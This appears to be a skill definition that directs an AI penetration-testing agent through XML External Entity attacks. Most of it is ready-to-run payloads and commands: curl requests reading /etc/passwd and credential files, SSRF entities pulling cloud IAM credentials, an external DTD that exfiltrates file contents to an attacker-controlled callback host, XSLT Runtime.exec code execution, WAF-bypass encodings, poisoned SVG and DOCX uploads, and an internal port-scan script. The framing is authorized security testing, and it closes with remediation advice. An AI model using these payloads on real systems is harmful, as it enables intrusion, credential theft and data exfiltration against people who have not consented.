# XXE Attack Skill

XML External Entity exploitation against XML, SOAP, SAML, RSS, SVG and Office document parsers. Drives DOCTYPE/entity probing, XInclude and XSLT abuse, blind exfiltration via parameter entities and external DTDs, and SSRF pivots through XML stacks.

## When to Classify Here

Use this skill when the user requests parser-level XML attacks, including:
- Reading server files through `<!ENTITY>` declarations referencing `file://` resources
- Reaching internal services or cloud metadata via `SYSTEM "http://..."` entities
- Out-of-band XXE through external DTDs and parameter entities (blind file/data exfiltration)
- XInclude (`xi:include`) abuse where general entity resolution is hardened but transclusion is open
- XSLT `document()`, `xsl:import`, `xsl:include` abuse against report/transform engines
- Probing SVG renderers, OOXML/ODF parsers, SAML ACS endpoints, SOAP/XML-RPC services
- Entity expansion DoS (billion laughs, quadratic blowup) when the user explicitly wants to test parser limits

Keywords: xxe, xml external entity, doctype, entity, system entity, xinclude, xi:include, xslt document, parameter entity, external dtd, oob xxe, blind xxe, billion laughs, svg upload xxe, docx xxe, ooxml entity, saml xml, soap entity, xml-rpc entity, xml parser, libxml2 entity, xerces entity

### Boundary against neighboring skills

- Not `sql_injection` or `sqli_exploitation`: those drive SQL grammar tampering, not XML parser misuse.
- Not built-in `xss`: XXE runs server-side inside an XML parser; XSS runs client-side inside a browser DOM.
- Not built-in `ssrf`: SSRF is reached through user-supplied URLs or fetcher parameters. XXE may reach internal hosts as a secondary effect, but the primary surface is a DOCTYPE/entity inside an XML payload. If the request is "the server fetches a URL I supply", classify as `ssrf` instead.
- Not built-in `path_traversal`: path traversal walks file system parameters with `../` and wrappers like `php://filter` directly in a path argument. XXE reaches files exclusively through XML entity resolution.
- Not built-in `rce` or `cve_exploit`: only reach for XXE when the entry point is an XML body, an XML upload (SVG/OOXML/ODF), or an XSLT/XInclude transform. XSLT `expect://` chains or deserialization-after-XML belong in the rce path once the initial XXE is proven.
- Not community `api_testing`: that skill mentions XXE only as a Content-Type pivot during JWT/GraphQL/REST testing. Pick this skill when XML parsing itself is the core target.

## Tools

This workflow uses only tools already present in the agent's runtime:

- `query_graph` for prior-recon lookup (endpoints, technologies, parameters)
- `execute_curl` for sending crafted XML bodies and SOAP envelopes
- `kali_shell` for `interactsh-client` (OOB callbacks), `xmllint` parser sanity checks, ZIP repacking of OOXML/ODF, `dig`, `jq`, `curl` against attacker-controlled DTD hosts
- `execute_code` for in-process payload generation (DTD assembly, OOB orchestration, OOXML repackaging in Python)

No additional Kali packages are needed for this skill.

### Captured-traffic workflow (proxy_brain tools)

When HTTP Traffic Capture is enabled, redamon.sitemap and redamon.query surface XML-speaking endpoints already observed (Content-Type xml, `.asmx`/`.svc`, SOAP paths) without re-crawling. redamon.replay takes one captured XML or JSON transaction and swaps its body for a DOCTYPE/entity payload (set headers to switch Content-Type to application/xml), then redamon.grep reads a disclosed file (for example /etc/passwd) out of the response, or redamon.diff compares it against a benign baseline replay. Where the proxy stops: blind OOB exfiltration (external DTD plus interactsh) and XSLT-to-RCE stay in the execute_curl / kali_shell path; redamon.replay is pinned to the origin host.

## Workflow

### Phase 1: Reconnaissance (Informational)

1. **Inventory XML-speaking endpoints from prior recon.** Use `query_graph` to find candidates already discovered by Katana, Nuclei or HTTP probes:
   ```
   MATCH (e:Endpoint)
   WHERE e.project_id = $project_id
     AND (e.content_type =~ '(?i).*xml.*'
          OR e.url =~ '(?i).*\\.(xml|xsd|xsl|xslt|svg|wsdl|rss|atom|asmx)$'
          OR e.url =~ '(?i).*(soap|saml|xmlrpc|/ws/|/services/|/api/.*xml).*')
   RETURN e.url, e.method, e.content_type, e.status_code
   ```
   Also pull `Parameter` nodes whose names hint at XML processing:
   ```
   MATCH (p:Parameter) WHERE p.project_id = $project_id
     AND p.name =~ '(?i)(xml|xsl|xslt|xinclude|import|transform|payload|data|body|file|svg|docx)'
   RETURN p.url, p.name, p.method
   ```

2. **Probe declared content types.** For each candidate, send a benign XML body via `execute_curl` and look for parser-shaped responses (XML in body, `application/xml` Content-Type, schema validation errors, `org.xml.sax.*`, `lxml.etree.*`, `System.Xml.*`):
   ```bash
   curl -sk -X POST "https://<target>/<endpoint>" \
     -H "Content-Type: application/xml" \
     -d '<?xml version="1.0"?><probe>ok</probe>' -i | head -40
   ```

3. **DOCTYPE acceptance probe.** Without external resolution, confirm the parser even reads a DTD subset. Anything besides "DOCTYPE forbidden" is a hint:
   ```bash
   curl -sk -X POST "https://<target>/<endpoint>" \
     -H "Content-Type: application/xml" \
     --data-binary $'<?xml version="1.0"?>\n<!DOCTYPE r [<!ELEMENT r ANY>]>\n<r>ok</r>' -i | head -40
   ```

4. **Enumerate XML-bearing upload surfaces.** If file uploads exist in the recon graph, mark SVG, MathML, DOCX, XLSX, PPTX, ODT, ODS, plist, RSS/Atom feeds, WSDL imports and SAML metadata XML for later phase-2 testing.

5. **Spin up an OOB collector** (used in Phase 2 and Phase 3) so its callback URL is ready before you fire blind payloads. `interactsh-client` prints the registered domain to stdout and writes incoming interactions to the `-o` file, so capture both:
   ```bash
   interactsh-client -v -o /tmp/xxe-oast.hits >/tmp/xxe-oast.out 2>&1 &
   sleep 5
   OAST_HOST=$(grep -oE '[a-z0-9]{20,40}\.oast\.[a-z]+' /tmp/xxe-oast.out | head -1)
   echo "OAST_HOST=$OAST_HOST"
   ```
   Use `tail -f /tmp/xxe-oast.hits` (or `tail -n 100 /tmp/xxe-oast.out`) later to read the actual DNS/HTTP callbacks.

6. **Decide the parser-capability oracle** to use during exploitation: visible reflection in the response, error message length/shape diff, ETag/Content-Length diff, or OOB DNS/HTTP hits.

Once at least one XML-accepting endpoint or XML-bearing upload surface is confirmed and an OOB callback URL is ready, **request transition to exploitation phase**.

### Phase 2: Exploitation

Run the probes in roughly the listed order; stop escalating as soon as you have one solid PoC for the report.

#### 2.1 Inline general entity (file disclosure)

UNIX target:
```bash
curl -sk -X POST "https://<target>/<endpoint>" \
  -H "Content-Type: application/xml" \
  --data-binary $'<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<r>&xxe;</r>'
```

Windows target:
```bash
curl -sk -X POST "https://<target>/<endpoint>" \
  -H "Content-Type: application/xml" \
  --data-binary $'<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>\n<r>&xxe;</r>'
```

Java-only escape for binary or multi-line files via the `jar:` wrapper:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "jar:http://attacker.tld/x.jar!/etc/passwd">]>
<r>&xxe;</r>
```

PHP `php://filter` for base64-wrapped reads when the parser strips raw bytes:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<r>&xxe;</r>
```

#### 2.2 SSRF through entity resolution

Reach internal control planes only from the XML body, never from the original URL:
```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://127.0.0.1:2375/version">]>
<r>&xxe;</r>
```

AWS IMDSv1 and Lightsail style metadata:
```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<r>&xxe;</r>
```

ECS task metadata via the env-derived URI:
```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.170.2/v2/credentials">]>
<r>&xxe;</r>
```

GCP, Azure, Alibaba and Oracle Cloud metadata variants follow the same shape; rotate the SSRF target list and look for differences in response length or status code.

#### 2.3 Out-of-band parameter entity (blind XXE)

When nothing reflects, use parameter entities + an external DTD. Host the DTD on a server you control. The simplest path is to drop it onto a temporary `python3 -m http.server` running on the same Kali sandbox and tunnel it out with `ngrok` if needed, or serve it from a `RequestBin`/`Webhook.site` style endpoint via `kali_shell`.

DTD file (`evil.dtd`) staged from `execute_code`:
```python
# execute_code
dtd = '''<!ENTITY % data SYSTEM "file:///etc/hostname">
<!ENTITY % wrap "<!ENTITY &#x25; exfil SYSTEM 'http://OAST_HOST/x?d=%data;'>">
%wrap;
%exfil;
'''
open('/tmp/evil.dtd','w').write(dtd)
```

Serve the DTD:
```bash
cd /tmp && python3 -m http.server 8088 >/tmp/http.log 2>&1 &
# expose if needed
ngrok http 8088 >/tmp/ngrok.log 2>&1 &
```

Trigger payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://OAST_HOST/evil.dtd"> %dtd;]>
<r>fire</r>
```

Confirm by tailing the OOB log:
```bash
tail -n 50 /tmp/xxe-oast.hits
```

For files that contain newlines (and would break query strings), error-based exfiltration via a forced parser failure works too:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % err "<!ENTITY &#x25; broken SYSTEM 'file:///nonexistent/%data;'>">
%err;
%broken;
```

#### 2.4 XInclude (entities disabled, transclusion still open)

Fire only against parsers that specifically build an XML document from request fragments (not the whole body), so a DOCTYPE is impossible but XInclude is honored:
```bash
curl -sk -X POST "https://<target>/<endpoint>" \
  -H "Content-Type: application/xml" \
  --data-binary '<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>'
```

#### 2.5 XSLT abuse against transform pipelines

Targets: report engines, server-side stylesheet uploads, XML-to-PDF/CSV converters, BIRT, JasperReports/FOP, xml-stylesheet processing-instruction consumers.

File read via `document()`:
```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

XSLT 1.0/2.0 extension functions on permissive engines (Saxon-PE/EE, Xalan):
```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:value-of select="rt:exec(rt:getRuntime(),'id')"/>
  </xsl:template>
</xsl:stylesheet>
```
Treat any `rt:exec` style execution as RCE proof and pivot accordingly.

#### 2.6 Protocol wrappers

Try alternate URI schemes when `file://` and `http://` are blocked. Confirm with the OOB collector:
- Java: `jar:`, `netdoc:`, `gopher:` (when the JRE has the corresponding handler enabled)
- PHP: `php://filter`, `expect://` (only when the `expect` extension is loaded)
- libxml2: `data:` for inline base64 reflection echoes

#### 2.7 Encoding and DOCTYPE bypasses

When a WAF or a regex strips the obvious string `<!DOCTYPE`, rotate variants:
- Mixed case: `<!DoCtYpE r [`
- UTF-16LE-encoded body with a matching `<?xml version="1.0" encoding="UTF-16"?>` prolog (run the body through `iconv -t UTF-16LE`)
- UTF-7 with `+ADw-` etc.
- CDATA shielding around payload bytes
- Comments, mixed CR/LF newlines, parameter entities only declared in the external subset

`execute_code` is useful for re-encoding payloads:
```python
# execute_code
body = open('/tmp/payload.xml','rb').read()
open('/tmp/payload.utf16.xml','wb').write(body.decode('utf-8').encode('utf-16le'))
```

#### 2.8 Special transports

SOAP envelope:
```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <!DOCTYPE d [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <d>&xxe;</d>
  </soap:Body>
</soap:Envelope>
```

SAML ACS endpoints: send a minimal probe with a DOCTYPE to the consumer URL. A surprising number of stacks parse and resolve entities before signature verification. Keep payloads small to avoid noisy logs.

RSS / Atom / OPML feeds and webhook ingestion: the same general-entity payload often lands inside a background processor that uses different parser settings than the public surface.

#### 2.9 SVG and Office documents

SVG: inline an entity inside the SVG itself, then upload through any avatar or attachment surface. Server-side `svg-to-png/pdf` renderers parse the file:
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="50">
  <text x="0" y="40">&xxe;</text>
</svg>
```

OOXML (DOCX/XLSX/PPTX) and ODF (ODT/ODS) are ZIP archives. Rebuild them with a poisoned `word/document.xml` (or `content.xml` for ODF):
```bash
# Stage a baseline document; replace its inner XML with one containing your DOCTYPE
mkdir -p /tmp/poison && cd /tmp/poison && cp /path/to/baseline.docx ./poisoned.docx
unzip -o poisoned.docx -d unpack
# Edit unpack/word/document.xml to inject:
#   <!DOCTYPE root [<!ENTITY xxe SYSTEM "http://OAST_HOST/x">]>
# at the top of the file, then reference &xxe; in any text node.
cd unpack && zip -r ../poisoned.docx . && cd ..
ls -la poisoned.docx
```
Upload via whatever route the application accepts (avatar, document import, mail attachment ingestion, document conversion API).

#### 2.10 Entity expansion (run only on explicit operator authorization)

Billion laughs amplifies cheaply but can take a target down. Only fire when the engagement scope explicitly allows DoS testing and after warning the operator. A safer demonstration uses 3-4 levels with small fan-out:
```xml
<!DOCTYPE lolz [
 <!ENTITY a "aaaa">
 <!ENTITY b "&a;&a;&a;">
 <!ENTITY c "&b;&b;&b;">
]>
<r>&c;</r>
```

If destructive payloads are forbidden, document the parser's lack of `XMLConstants.FEATURE_SECURE_PROCESSING` (or equivalent) and stop.

### Phase 3: Post-Exploitation

1. **File-system enumeration** through repeated entity reads. Grab high-signal files first:
   - `/etc/passwd`, `/etc/hostname`, `/etc/hosts`, `/etc/issue`, `/proc/self/environ`, `/proc/self/cmdline`, `/proc/1/cgroup` (container fingerprint)
   - Application secrets: `application.properties`, `appsettings.json`, `web.config`, `.env`, `database.yml`, `id_rsa`, `~/.aws/credentials`, `~/.ssh/config`
   - On Windows: `c:/windows/win.ini`, `c:/inetpub/wwwroot/web.config`, `c:/users/<u>/.aws/credentials`

2. **Cloud credential extraction** when the SSRF probe in 2.2 hit a metadata service. Pull the role name first, then the credential blob:
   ```xml
   <!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>">]>
   <r>&x;</r>
   ```

3. **Internal port scan via XXE-SSRF**. Iterate hosts/ports through `execute_code` so retries, timeouts and pivots are in one place:

```python
# execute_code
import requests
targets = ['http://127.0.0.1:%d' % p for p in (22, 80, 443, 2375, 6379, 8500, 9200, 11211)]
for t in targets:
    payload = f'<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY x SYSTEM "{t}">]>\n<r>&x;</r>'
    r = requests.post('https://<target>/<endpoint>', data=payload,
                      headers={'Content-Type': 'application/xml'}, timeout=8, verify=False)
    print(t, r.status_code, len(r.text), r.elapsed.total_seconds())
```

4. **Cross-channel parity check**. Replay the winning payload across every related ingest route (REST endpoint, SOAP service, SAML ACS, SVG upload, OOXML import, RSS subscribe, background webhook). Different parsers per route is one of the most common XXE patterns.

5. **Chain into RCE only when a clear primitive exists**: `expect://` shell, `xsl:exec`/Saxon `rt:exec`, deserialization gadgets reached via SSRF (Jolokia, Spring Actuator, Jenkins). Otherwise stop and report.

## Reporting Guidelines

For every confirmed finding, include:

- **Vulnerability class**: inline-entity / OOB parameter-entity / XInclude / XSLT-document / entity-expansion DoS
- **Affected endpoint or upload route**, HTTP method, accepted Content-Type
- **Parser fingerprint** (libxml2 / Xerces / .NET XmlReader / Saxon / lxml / Nokogiri) inferred from error shape or banner
- **Triggering payload** as a copy-pasteable code block
- **Evidence**: response excerpt for direct disclosure, OOB log lines for blind exfiltration, screenshot or hex dump for binary reads
- **Reached resources**: exact files, internal hosts, cloud metadata paths, secrets touched
- **Impact**: data exposure scope, SSRF footprint, RCE pivot if achieved, DoS feasibility
- **Cross-channel coverage**: which other parser-equivalent routes (SOAP, SAML, SVG, OOXML, webhooks) were also vulnerable
- **Fix recommendation**: disable DOCTYPE and external entity resolution per parser (`disallow-doctype-decl`, `XMLConstants.FEATURE_SECURE_PROCESSING`, `libxml2 XML_PARSE_NONET`, `defusedxml`), turn off XInclude, restrict XSLT extension functions, and verify the same hardening across every parser instance in the codebase

## Important Notes

- Default to OOB. Reflective payloads sometimes log full file content into application logs; OOB callbacks against your own collector keep the noise off the target.
- Keep payloads minimal. Avoid `billion laughs` unless DoS testing is explicitly authorized.
- Some parsers strip DOCTYPE silently and still fail closed. Distinguish "blocked" (no entity resolution, no error) from "secure" (explicit `DOCTYPE not allowed` exception) before reporting a negative.
- A 200 OK with the same body length as the baseline often means entity resolution is disabled. Diff against a clean run before declaring a parser hardened.
- If the operator forbids external callbacks, skip the parameter-entity DTD path in 2.3 and lean on inline general entities, error-based timing, and XInclude/XSLT instead.
- XSLT extension function execution (`rt:exec`, `os:run`) crosses into RCE territory. Stop and ask for explicit RCE authorization before running commands beyond `id`/`hostname`.
- Background processors (PDF generators, mail-to-ticket pipelines, virus scanners with embedded XML, document indexers) frequently use a different parser than the public API. Always retest the winning payload through every async ingest path you can reach.
- References for triage and write-ups: PortSwigger Web Security Academy XXE labs, OWASP XML External Entity Prevention Cheat Sheet, HackerOne reports on Uber (`#125980`), Wikiloc (`#19872`), Twitter PDF generator XXE.
